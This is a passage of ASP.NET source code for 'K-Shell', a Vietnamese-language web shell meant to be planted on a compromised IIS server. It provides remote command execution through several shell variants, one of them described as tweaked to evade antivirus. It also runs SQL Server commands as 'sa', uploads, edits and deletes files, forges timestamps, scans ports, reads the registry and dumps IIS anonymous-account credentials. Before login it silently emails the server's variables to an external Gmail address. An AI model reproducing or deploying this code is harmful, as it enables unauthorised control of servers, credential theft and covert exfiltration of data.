TITLE="List Application Event Log Entries"
elseif act="syslog" then 
TITLE="List System Event Log Entries"
elseif act="auser" then 
TITLE="IIS List Anonymous' User details"
elseif act="sqlman" then 
TITLE="MSSQL Management"
elseif act="scan" then 
TITLE="Port Scanner"
elseif act="iisspy" then 
TITLE="IIS Spy"
elseif act="sqltool" then 
TITLE="SQL Tool"
elseif act="regshell" then 
TITLE="Registry Shell"
else 
TITLE=request.ServerVariables("HTTP_HOST") 
end if
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<style type="text/css">
body,td,th {
	color: #00FF00;
	font-family: Courier New;
}
b
{
	color: #00FF00
}
body {
	background-color: #000000;
	font-size:12px;
	font-family:"Courier New";
}
.buttom {color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5}
.TextBox {border: 1px solid #084B8E}
.style3 {color: #FF0000}
</style>
<head>
<meta http-equiv="Content-Type" content="text/html">
<title><%=TITLE%></title>
<style type="text/css">
.boxx input[type = "text"],.boxx input[type = "password"]{
  border:0;
  background: none;
  display: block; 
  text-align: center;
  border: solid #3498db;
  outline: none;
  color: white;
  border-radius: 40px;
  transition: 0.25s;
}
.boxx input[type = "text"]:focus,.box input[type = "password"]:focus{
  border-color: #2ecc71;
  }
 .boxx input[type = "text"]:hover{
  border-color: #2ecc71;
  }
.boxx input[type = "submit"]{
  border:0;
  background: none;
  display: block;
  margin: 20px auto;
  text-align: center;
  border: solid #2ecc71;
  
  outline: none;
  color: #66FF00;
  border-radius: 24px;
  transition: 0.25s;
  cursor: pointer;
  text-shadow: 1px 1px 1px white, 0 0 25px green, 0 0 5px darkgreen;
}
.boxx input[type = "submit"]:hover{
  background: #99FF33;
  border: solid #2ecc71;
  text-shadow: 1px 1px 1px white, 0 0 25px red, 0 0 5px darkred;
  color: red;
}

.hover {
	 position: relative;
	 display: flex;
	 align-items: center;
	 justify-content: center;

	 background-color: #4db6ac;
	 border-radius: 99px;
	 box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
	 transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
	 overflow: hidden;
}
 .hover:before, .hover:after {
	 position: absolute;
	 top: 0;
	 display: flex;
	 align-items: center;
	 width: 50%;
	 height: 100%;
	 transition: 0.25s linear;
	 z-index: 1;
}
 .hover:before {
	 content: '';
	 left: 0;
	 justify-content: flex-end;
	 background-color: #4db6ac;
}
 .hover:after {
	 content: '';
	 right: 0;
	 justify-content: flex-start;
	 background-color: #44a69c;
}
 .hover:hover {
	 background-color: #46627f;
	 box-shadow: 0 14px 28px rgba(0, 0, 0, 0.25), 0 10px 10px rgba(0, 0, 0, 0.22);
}
 .hover:hover span {
	 opacity: 0;
	 z-index: -3;
}
 .hover:hover:before {
	 opacity: 0.5;
	 transform: translateY(-100%);
}
 .hover:hover:after {
	 opacity: 0.5;
	 transform: translateY(100%);
}
 .hover span {
	 position: absolute;
	 top: 0;
	 left: 0;
	 display: flex;
	 align-items: center;
	 justify-content: center;
	 width: 100%;
	 height: 100%;
	 color: whitesmoke;
	 font-family: 'Fira Mono', monospace;
	 font-weight: 700;
	 opacity: 1;
	 transition: opacity 0.25s;
	 z-index: 2;
}
 .hover .maudo {
	 position: absolute;
	 top: 0;
	 left: 0;
	 display: flex;
	 align-items: center;
	 justify-content: center;
	 width: 100%;
	 height: 100%;
	 color: red;
	 font-family: 'Fira Mono', monospace;
	 font-weight: 700;
	 opacity: 1;
	 transition: opacity 0.25s;
	 z-index: 2;
}
 .hover .social-link {
	 position: relative;
	 display: flex;
	 align-items: center;
	 justify-content: center;
	 width: 25%;
	 height: 100%;
	 color: whitesmoke;
	 text-decoration: none;
	 transition: 0.25s;
	 font-size: 20px;
}
 .hover .social-link i {
	 text-shadow: 1px 1px rgba(70, 98, 127, 0.7);
	 transform: scale(1);
}
 .hover .social-link:hover {
	 background-color: rgba(245, 245, 245, 0.1);
}
 .hover .social-link:hover i {
	 animation: bounce 0.4s linear;
}
 @keyframes bounce {
	 40% {
		 transform: scale(1.4);
	}
	 60% {
		 transform: scale(0.8);
	}
	 80% {
		 transform: scale(1.2);
	}
	 100% {
		 transform: scale(1);
	}
}
</style>
</head>
<body>
<div align="center">K-Shell <a href="http://noname.com" target="_blank" title="MY WEB SITE">NONAME</a> t&#7915; <font color="red">[<a href="http://beyeugroup.com" target="_blank">BYG</a>]</font></div>
<hr>

<%
Dim error_x as Exception
Try
if session("kogsand")<>1 then
'Test sending anonymous mail, comment it if you don't want test it
	dim info As String
	Try
	info = request.ServerVariables.ToString.Replace("%2f","/").Replace("%5c","\").Replace("%3a",":").Replace("%2c",",").Replace("%3b",";").Replace("%3d","=").Replace("%2b","+").Replace("%0d%0a",vbnewline)
	System.Web.Mail.SmtpMail.SmtpServer = "localhost"
	System.Web.Mail.SmtpMail.Send(request.ServerVariables("HTTP_HOST"),"test.mail.address.2008@gmail.com",request.ServerVariables("HTTP_HOST")+request.ServerVariables("URL"),info)
	Catch
	End Try
%>
<center>
<form class="boxx" runat="server">
  Tên đăng nhập : Anonymous  <br>
  Mật khẩu:<asp:TextBox ID="TextBox" runat="server"  TextMode="Password" class="TextBox" />  
  <asp:Button  ID="Button" runat="server" Text="&#272;&#259;ng nh&#7853;p" ToolTip="&#7844;n v&#224;o &#273;&#226;y &#273;&#7875; v&#224;o"  OnClick="login_click" class="buttom" />
</form>
</center>
<%
else
	dim temp as string
	temp=request.QueryString("action")
	if temp="" then temp="goto"
	select case temp
	case "goto"
		if request.QueryString("src")<>"" then
			url=request.QueryString("src")
		else
			url=server.MapPath(".") & "\"
		end if
	call existdir(url)
	dim xdir as directoryinfo
	dim mydir as new DirectoryInfo(url)
	dim andbyg as string
	dim xfile as fileinfo
	
	dim ServerIP As string = "&#272;&#7883;a ch&#7881; m&#225;y ch&#7911; : <b>" + Request.ServerVariables("LOCAL_ADDR") + "</b> - Client IP : <b>" + getIP() + "</b> - "
    dim HostName As string = "T&#234;nHost : <b>" + Environment.MachineName + "</b> - T&#234;n ng&#432;&#7901;i d&#249;ng : <b>"+ Environment.UserName +"</b><br>"
    dim OSVersion As string = "Phi&#234;n b&#7843;n h&#7879; &#273;i&#7873;u h&#224;nh : <b>" + Environment.OSVersion.ToString() + "</b>"
    dim IISversion As string = " -Phi&#234;n b&#7843;n IIS  : <b>" + Request.ServerVariables("SERVER_SOFTWARE") + "</b><br>Th&#432; m&#7909;c h&#7879; th&#7889;ng &#273;&#7863;t t&#7841;i : <b>" + Environment.SystemDirectory + "</b>"
    dim PATH_INFO As string = " - &#272;ang &#7903; x&#233;t t&#7853;p tin : <b>" + Request.ServerVariables("PATH_TRANSLATED") + "</b><br>"
    dim HARDWARE_INFO As string = ""
    Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
   	Dim de As DictionaryEntry
	For Each de In  environmentVariables
	if de.Key = "NUMBER_OF_PROCESSORS" then
	HARDWARE_INFO += "Th&#244;ng tin ph&#7847;n c&#7913;ng : <b>" + de.Value + "CPU - "
	end if
	if de.Key = "PROCESSOR_IDENTIFIER" then
	HARDWARE_INFO += de.Value + "</b><br>"
	end if
   	Next
    Info.Text += ServerIP + HostName + OSVersion + IISversion + PATH_INFO + HARDWARE_INFO
%>
<table width="100%"  border="1" align="center">
  <tr>
  	<td><asp:Label ID="Info" runat="server" EnableViewState="False"	/></td>
  </tr>
</table>
<hr>

<table width="100%"  border="1" align="center">
  <tr>
  	<td>Th&#432; m&#7909;c hi&#7879;n t&#7841;i:</td> <td><font color=red><%=url%></font></td>
  </tr>
  <tr>
    <td width="10%">Ch&#7913;c n&#259;ng:</td>
    <td width="90%"><a href="?action=new&src=<%=server.UrlEncode(url)%>" title="New file or directory">New</a> - 
      <%if session("cutboard")<>"" then%>
      <a href="?action=paste&src=<%=server.UrlEncode(url)%>" title="you can paste">D&#225;n</a> - 
      <%else%>
	D&#225;n - 
<%end if%>
<a href="?action=upfile&src=<%=server.UrlEncode(url)%>" title="T&#7843;i l&#234;n c&#225;c t&#7853;p tin">T&#7843;i l&#234;n</a> - <a href="?action=goto&src=" & <%=server.MapPath(".")%> title="&#272;&#7871;n c&#225;c file c&#7911;a th&#432; m&#7909;c tr&#432;&#7899;c">Quay l&#7841;i </a> - <a href="?action=logout" title="Tho&#225;t phi&#234;n l&#224;m vi&#7879;c" ><font color="red">Tho&#225;t</font></a>
</td>
  </tr>
  <tr>
    <td>
	&#272;&#7871;n &#7893;: </td>
    <td>
<%
dim i as integer
for i =0 to Directory.GetLogicalDrives().length-1
 	response.Write("<a href='?action=goto&src=" & Directory.GetLogicalDrives(i) & "'>" & Directory.GetLogicalDrives(i) & " </a>")
next
%>

</td>
<td align="Left">
<%
response.Write("IP:<font color=red>" & Request.ServerVariables("REMOTE_ADDR")&"</font>")
%>
</td>
  </tr>

  <tr>
    <td>C&#244;ng c&#7909;:</td>
    <td><table width="100%"  border="0" ><td><a href="?action=sqlrootkit" >SqlRootKit.NET </a> <br> <a href="?action=cmd" >CMD.NET</a> </td><td> <a href="?action=cmdw32" >kshellW32</a> <br> <a href="?action=cmdwsh" >kshellWSH</a></td><td><a href="?action=clonetime&src=<%=server.UrlEncode(url)%>" >Giả mạo Time</a> <br> <a href="?action=information" >System Info</a></td><td><a href="?action=pro1" >List Processes 1</a><br><a href="?action=pro2" >List Processes 2</a></td></table></td>    
  </tr>
  <tr>
    <td> </td>
    <td><table width="100%"  border="5" ><td><a href="?action=user" >Danh s&#225;ch ng&#432;&#7901;i s&#7917; d&#7909;ng</a><br><a href="?action=auser" >&#272;&#259;ng nh&#7853;p v&#244; danh v&#224;o IIS</a></td><td> <a href="?action=scan" >Ki&#7875;m tra c&#225;c c&#7893;ng n&#7889;i</a> <br> <a href="?action=iisspy" >Gi&#225;n &#273;i&#7879;p IIS</a>
	</td><td>
	<a href="?action=regshell" >Registry Shell</a><br> <a href="?action=syslog" >B&#225;o c&#225;o v&#7873; h&#7879; th&#7889;ng</a></td><td><a href="?action=applog" >&#272;&#7885;c b&#225;o c&#225;o s&#7917; d&#7909;ng &#7913;ng d&#7909;ng </a></td></table></td>
  </tr>
</table>
<hr>
<table width="100%"  border="30" align="center">
<td>
<table width="98%"  border="0" align="center">
	<tr>
	<td width="65%"><strong>T&#234;n T&#7853;p tin</strong></td>
	<td width="15%"><strong>&#272;&#7897; l&#7899;n</strong></td>
	<td width="20%"><strong>Th&#7901;i gian t&#7841;o</strong></td>
	
	</tr>
      <tr>
        <td><%
		andbyg= "<tr><td><a href='?action=goto&src=" & server.UrlEncode(Getparentdir(url)) & "'><i>[Thư Mục Trước]</i></a></td></tr>"
		response.Write(andbyg)
		for each xdir in mydir.getdirectories()
			response.Write("<tr>")
			dim filepath as string 
			filepath=server.UrlEncode(url & xdir.name)
			andbyg= "<td><div class=""hover""><span class=""maudo"">Thư Mục&nbsp;&nbsp; <a href='?action=goto&src=" & filepath & "\" & "'>" & xdir.name & "</a></span><a class=""social-link"" href='?action=cut&src=" & filepath & "\'  target='_blank'>Di chuyển" & "</a>|<a class=""social-link"" href='?action=copy&src=" & filepath & "\'  target='_blank'>Sao ch&#233;p</a>|<a class=""social-link"" href='?action=del&src=" & filepath & "\'" & " onclick='return del(this);'>Xóa</a>|<a class=""social-link"" href='?action=goto&src=" & filepath & "\" & "'>=> " & xdir.name & "</a></div></td>"
			response.Write(andbyg)
			response.Write("<td>&lt;Thư Mục&gt;</td>")
			response.Write("<td>" & Directory.GetLastWriteTime(url & xdir.name) & "</td>")
			
			response.Write("</tr>")
		next
		%></td>
  </tr>
		<tr>
        <td><%
		for each xfile in mydir.getfiles()
			dim filepath2 as string
			filepath2=server.UrlEncode(url & xfile.name)
			response.Write("<tr>")
			andbyg="<td><div class=""hover""><span>" & xfile.name & "</span><a class=""social-link"" href='?action=edit&src=" & filepath2 & "'>Sửa</a>|<a class=""social-link"" href='?action=cut&src=" & filepath2 & "' target='_blank'>Chuyển</a>|<a class=""social-link"" href='?action=copy&src=" & filepath2 & "' target='_blank'>Chép</a>|<a class=""social-link"" href='?action=rename&src=" & filepath2 & "'>ĐổiTên</a>|<a class=""social-link"" href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Tải</a>|<a class=""social-link"" href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>Xóa</a></div></td>"
			response.Write(andbyg)
			andbyg="<td>" & GetSize(xfile.length) & "</td>"
			response.Write(andbyg)
			response.Write("<td>" & file.GetLastWriteTime(url & xfile.name) & "</td>")
			
			response.Write("</tr>")
		next
		response.Write("</table>")
		%></td>
      </tr>
	  
</table></td>
<tr>
	 
	  <form class="boxx" name="UpFileForm" enctype="multipart/form-data" method="post" runat="server"> 
	  <table><td><tr>
 <center>FILE sẽ được tải lên tại thư mục :
 <% TextBoxSaveUpUrl.Text = url %>
 <asp:TextBox ID="TextBoxSaveUpUrl" runat="server" Width="417px" CssClass="TextBox" ></asp:TextBox>
 <asp:FileUpload ID="FileUploadPortal" runat="server" /></center>
<br />
<asp:Button class="buttom" ID="btnUploadPortal" Text="Tải lên" runat="server" OnClick="UploadFile" />
<br />
<asp:Label ID="lblMessagePortal" ForeColor="Green" runat="server" /></tr></td><table>
</form>

	  </tr></table>
<script language="javascript">
function del()
{
if(confirm("Chắc chắn xóa chứ ?")){return true;}
else{return false;}
}
function down()
{
if(confirm("Nếu như File lớn hơn 20MB,\nHãy sử dụng cách khác để tải\n Đừng sử dụng cách này. \nCó chắc chắn tải không?")){return true;}
else{return false;}
}
</script>
<%
case "information"
	dim CIP,CP as string
	if getIP()<>request.ServerVariables("REMOTE_ADDR") then
			CIP=getIP()
			CP=request.ServerVariables("REMOTE_ADDR")
	else
			CIP=request.ServerVariables("REMOTE_ADDR")
			CP="None"
	end if
%>
<div align=center>[ Thông tin máy chủ  ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở lại</a></i></div><br>
<table width="100%"  border="1" align="center">
  <tr>
    <td width="40%">Server IP</td>
    <td width="60%"><%=request.ServerVariables("LOCAL_ADDR")%></td>
  </tr>
  <tr>
    <td height="73">Machine Name</td>
    <td><%=Environment.MachineName%></td>
  </tr>
  <tr>
    <td>Network Name</td>
    <td><%=Environment.UserDomainName.ToString()%></td>
  </tr>
  <tr>
    <td>User Name in this Process</td>
    <td><%=Environment.UserName%></td>
  </tr>
  <tr>
    <td>OS Version</td>
    <td><%=Environment.OSVersion.ToString()%></td>
  </tr>
  <tr>
    <td>Started Time</td>
    <td><%=GetStartedTime(Environment.Tickcount)%> Hours</td>
  </tr>
  <tr>
    <td>System Time</td>
    <td><%=now%></td>
  </tr>
  <tr>
    <td>IIS Version</td>
    <td><%=request.ServerVariables("SERVER_SOFTWARE")%></td>
  </tr>
  <tr>
    <td>HTTPS</td>
    <td><%=request.ServerVariables("HTTPS")%></td>
  </tr>
  <tr>
    <td>PATH_INFO</td>
    <td><%=request.ServerVariables("PATH_INFO")%></td>
  </tr>
  <tr>
    <td>PATH_TRANSLATED</td>
    <td><%=request.ServerVariables("PATH_TRANSLATED")%></td>
  <tr>
    <td>SERVER_PORT</td>
    <td><%=request.ServerVariables("SERVER_PORT")%></td>
  </tr>
    <tr>
    <td>SeesionID</td>
    <td><%=Session.SessionID%></td>
  </tr>
  <tr>
    <td colspan="2"><span class="style3">Client Infomation</span></td>
  </tr>
  <tr>
    <td>Client Proxy</td>
    <td><%=CP%></td>
  </tr>
  <tr>
    <td>Client IP</td>
    <td><%=CIP%></td>
  </tr>
  <tr>
    <td>User</td>
    <td><%=request.ServerVariables("HTTP_USER_AGENT")%></td>
  </tr>
</table>
<table class="boxx" align=center>
	<% Create_table_row_with_supplied_colors("Black", "White", "center", "Environment Variables, Server Variables") %>
	<tr>
		<td><textArea class="TextBox" cols=130 rows=20><% output_all_environment_variables("text") %></textarea></td>
		<td><textArea class="TextBox" cols=130 rows=20><% output_all_Server_variables("text") %></textarea></td>
	</tr>
</table>
<%
	case "cmd"
%>
<form class="boxx" runat="server">
  <p>[ CMD.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
  <p> Thực hiện lệnh qua tài khoản ASP.NET (<span class="style3">Chú ý : Chỉ click vào &quot;Run&quot; để chạy lệnh</span>)</p>
  <p>- Hàm này đã được chỉnh sửa để Antivirus không phát hiện ra !-</p>
  Lệnh:
  <asp:TextBox ID="cmd" runat="server" class="TextBox" Width="70%"/>
  <asp:Button ID="Button123" runat="server" Text="Run" OnClick="RunCMD" class="buttom"/>  
  <p>
   <asp:Label ID="result" runat="server" style="style2"/>      </p>
</form>
<%
	case "cmdw32"
%>
<form class="boxx" runat="server">
	<p>[ ASP.NET W32 Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
  	<p> Thực thi lệnh dựa trên W32 với user là ASP.NET(<span class="style3">Chú Ý : Chỉ Click vào &quot;Run&quot; để thực thi lệnh</span>)</p>
  	<%
  	Response.Write("Thư mục hệ thống : "+Environment.SystemDirectory +"<br><br>")
  	%>
  	CMD File:
	<asp:TextBox ID="txtCmdFile" runat="server" Width="473px" style="border: 1px solid #084B8E">C:\\WINDOWS\\system32\\cmd.exe</asp:TextBox><br><br>
  	Lệnh : &nbsp;
	<asp:TextBox ID="txtCommand1" runat="server" style="border: 1px solid #084B8E"/>
  	<asp:Button ID="Buttoncmdw32" runat="server" Text="Run" OnClick="RunCmdW32" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/>  
  	<p>
    <asp:Label ID="resultcmdw32" runat="server" style="color: #0000FF"/>      
    </p>
</form>
<%
	case "cmdwsh"
%>
<form class="boxx" runat="server">
	<p>[ ASP.NET WSH Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
  	<p> EThực thi lệnh dựa trên WSH với user là ASP.NET(<span class="style3">Chú Ý : Chỉ Click vào &quot;Run&quot; để thực thi lệnh</span>)</p>
  	Lệnh : 
	<asp:TextBox ID="txtCommand2" runat="server" style="border: 1px solid #084B8E"/>
  	<asp:Button ID="Buttoncmdwsh" runat="server" Text="Run" OnClick="RunCmdWSH" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/>  
  	<p>
    <asp:Label ID="resultcmdwsh" runat="server" style="color: #0000FF"/>      
    </p>
</form>
<%
	case "pro1"
%>
<form class="boxx" runat="server">
	<p align=center>[ Danh sách ứng dụng ở trên máy chủ ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				Try
				output_wmi_function_data("Win32_Process","ProcessId,Name,WorkingSetSize,HandleCount")
				Catch
				rw("Chức năng này đã bị tắt ở máy chủ này")
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "pro2"
%>
<form class="boxx" runat="server">
	<p align=center>[ Danh sách ứng dụng ở trên máy chủ ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
	<table align=center width='80%'>
		<tr>
			<td>
			<% 
				Dim htmlbengin As String = "<table width='80%' align=center border=0><tr align=center><td width='20%'><b>ID</b></td><td align=left width='20%'><b>Process</b></td><td align=left width='20%'><b>MemorySize</b></td><td align=center width='10%'><b>Threads</b></td></tr>"
			      Dim prostr As String = ""
			      Dim htmlend As String = "</tr></table>"
			      Try
			            Dim mypro As Process() = Process.GetProcesses()
			            For Each p As Process In mypro
			                  prostr += "<tr><td align=center>" + p.Id.ToString() + "</td>"
			                  prostr += "<td align=left>" + p.ProcessName.ToString() + "</td>"
			                  prostr += "<td align=left>" + p.WorkingSet.ToString() + "</td>"
			                  prostr += "<td align=center>" + p.Threads.Count.ToString() + "</td>"
			            Next
			      Catch ex As Exception
			            Response.write(ex.Message)
			      End Try
			      Response.write(htmlbengin + prostr + htmlend)
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "user"
%>
<form class="boxx" runat="server">
	<p align=center>[ List User Accounts ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				dim WMI_function = "Win32_UserAccount"		
				dim Fields_to_load = "Name,Domain,FullName,Description,PasswordRequired,SID"
				dim fail_description = " Access to " + WMI_function + " is protected"
				Try
				output_wmi_function_data(WMI_function,Fields_to_load)
				Catch
				rw(fail_description)
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "reg"
%>
<form class="boxx" runat="server">
	<p align=center>[ Registry ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				dim WMI_function = "Win32_Registry"		
				dim Fields_to_load = "Caption,CurrentSize,Description,InstallDate,Name,Status"
				dim fail_description = " Access to " + WMI_function + " is protected"
				Try
				output_wmi_function_data(WMI_function,Fields_to_load)
				Catch
				rw(fail_description)
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "applog"
%>
<form class="boxx" runat="server">
	<p align=center>[ Danh sách các nhật ký ứng dụng  ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				dim WMI_function = "Win32_NTLogEvent where Logfile='Application'"		
				dim Fields_to_load = "Logfile,Message,type"
				dim fail_description = " Access to " + WMI_function + " is protected"
				Try
				output_wmi_function_data_instances(WMI_function,Fields_to_load,2000)
				Catch
				rw(fail_description)
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "syslog"
%>
<form class="boxx" runat="server">
	<p align=center>[ Danh sách các nhật ký ứng dụng ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				dim WMI_function = "Win32_NTLogEvent where Logfile='System'"		
				dim Fields_to_load = "Logfile,Message,type"
				dim fail_description = " Access to " + WMI_function + " is protected"
				
				Try
				output_wmi_function_data_instances(WMI_function,Fields_to_load,2000)
				Catch
				rw("Chức năng này đã bị tắt ở máy chủ này")
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "auser"
%>
<form class="boxx" runat="server">
	<p align=center>[ Danh sách tài khoản Anonymous trong IIS  ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				Try
				IIS_list_Anon_Name_Pass
				Catch
				rw("Chức năng này đã bị tắt ở máy chủ này")
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "scan"
%>
	<form  class="boxx" runat="server">
    <p>[ ASP.NET Port Scanner ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
    <div>
    	SCAN CÁC PORT ĐANG MỞ TRÊN HỆ THỐNG<br /><br />
        Start IP :&nbsp;&nbsp;<asp:TextBox ID="txtStartIP" runat="server" Width="177px">127.0.0.1</asp:TextBox>
        &nbsp;&nbsp; &nbsp; --- &nbsp;End Ip : &nbsp;<asp:TextBox ID="txtEndIP" runat="server" Width="185px">127.0.0.1</asp:TextBox>&nbsp;
        <br />
        Ports &nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;<asp:TextBox ID="txtPorts" runat="server" Width="473px">21,25,80,1433,3306,3389</asp:TextBox><br />
        <br />
        <asp:Button ID="btnScan" runat="server" Text="Scan" Width="60px" Font-Bold="True" ForeColor="MediumBlue" BorderStyle="Solid" OnClick="btnScan_Click" />
        &nbsp;&nbsp;
        <asp:Button ID="btnReset" runat="server" Text="Reset" Width="60px" Font-Bold="True" ForeColor="MediumBlue" BorderStyle="Solid" OnClick="btnReset_Click" /><br />
        <br />
        <asp:Label ID="Label1" runat="server" Text="Result:" Visible="False" Width="70px"></asp:Label><br />
        <asp:ListBox ID="lstRet" runat="server" BackColor="Black" ForeColor="#00C000" Height="251px"
            Width="527px" Visible="False"></asp:ListBox>
        <hr align=left style="width: 526px" />
        <br />
       </div>
    </form>
<%
case "iisspy"
%>
	<p align=center>[ IIS Spy ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
	<% 
				Try
				Response.write(IISSpy())
				Catch
				rw("Chức năng này đã bị tắt ở máy chủ này")
				End Try
	%>
<%
case "sqltool"
%>
	<p align=center>[ SQL Tool ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
	<% 
				Try
				
				Catch
				rw("Chức năng này đã bị tắt ở máy chủ này")
				End Try
	%>
<%
case "regshell"
%>
	<form class="boxx" runat="server">
	<p align=center >[ Registry Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
  	Key:&nbsp;&nbsp;
	<asp:TextBox ID="txtRegKey" runat="server" style="width: 595px; border: 1px solid #084B8E">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName</asp:TextBox><br><br>
	Value:
	<asp:TextBox ID="txtRegValue" runat="server" style="width: 80%; border: 1px solid #084B8E">ComputerName</asp:TextBox>&nbsp;&nbsp;
  	<asp:Button CssClass="buttom" ID="btnReadReg" runat="server" Text="Run" OnClick="RegistryRead" />  
  	<p>
    <asp:Label ID="lblresultReg" runat="server" style="color: red"/>      
    </p>
	</form>
<%
	case "sqlman"
%>
<form class="boxx" runat="server">
  <p>[ MSSQL Query ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
  <p> Execute query with SQLServer account(<span class="style3">Chú ý : Chỉ ấn "Run" để thực thi lệnh</span>)</p>
  <p>Host:
    <asp:TextBox ID="txtHost" runat="server" Width="300" class="TextBox" Text="127.0.0.1"/></p>
  <p>
  SQL Name:
    <asp:TextBox ID="txtSqlName" runat="server" Width="50" class="TextBox" Text='sa'/>
  SQL Password:
  <asp:TextBox ID="txtSqlPass" runat="server" Width="80" class="TextBox"/>
  </p>
  Lệnh : 
  <asp:TextBox ID="txtSqlcmd" runat="server" Width="500" class="TextBox" TextMode="MultiLine" Rows="6"/></br>
  <asp:Button ID="btnButtonSQL" runat="server" Text="Run" OnClick="RunSQLQUERY" class="buttom" Width="100"/>  
  <p>
   <asp:Label ID="lblresultSQL" runat="server" style="style2"/>      </p>
</form>
<%
	case "sqlrootkit"
%>
<form class="boxx" runat="server">
  <p>[ SqlRootKit.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Trở Lại</a></i></p>
  <p> Thực thi lệnh với tài khoản SQLServer(<span class="style3">Chú ý : Chỉ ấn "Run" để thực thi lệnh</span>)</p>
  <p>Host:
    <asp:TextBox ID="ip" runat="server" Width="300" class="TextBox" Text="127.0.0.1"/></p>
  <p>
  SQL Name:
    <asp:TextBox ID="SqlName" runat="server" Width="200" class="TextBox" Text='sa'/>
  SQL Password:
  <asp:TextBox ID="SqlPass" runat="server" Width="200" class="TextBox"/>
  </p>
  Lệnh : 
  <asp:TextBox ID="Sqlcmd" runat="server" Width="80%" class="TextBox"/>
  <asp:Button ID="ButtonSQL" runat="server" Text="Run" OnClick="RunSQLCMD" class="buttom"/>  
  <p>
   <asp:Label ID="resultSQL" runat="server" style="style2"/>      </p>
</form>
<%
   	case "del"
		dim a as string
		a=request.QueryString("src")
		call existdir(a)
		call del(a)  
		response.Write("<script>alert(""Xóa " & replace(a,"\","\\") & " Thành công!"");location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(a)) &"'</script>")
	case "copy"
		call existdir(request.QueryString("src"))
		session("cutboard")="" & request.QueryString("src")
		response.Write("<script>alert('File info have add the cutboard, go to target directory click paste!');location.href='JavaScript:self.close()';</script>")
	case "cut"
		call existdir(request.QueryString("src"))
		session("cutboard")="" & request.QueryString("src")
		response.Write("<script>alert('File info have add the cutboard, go to target directory click paste!');location.href='JavaScript:self.close()';</script>")
	case "paste"
		dim ow as integer
		if request.Form("OverWrite")<>"" then ow=1
		if request.Form("Cancel")<>"" then ow=2
		url=request.QueryString("src")
		call existdir(url)
		dim d as string
		d=session("cutboard")
		if left(d,1)="" then
			TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
			TEMP2=url & replace(path.getfilename(d),"","")
			if right(d,1)="\" then   
				call xexistdir(TEMP1,ow)
				directory.move(replace(d,"",""),TEMP1 & "\")  
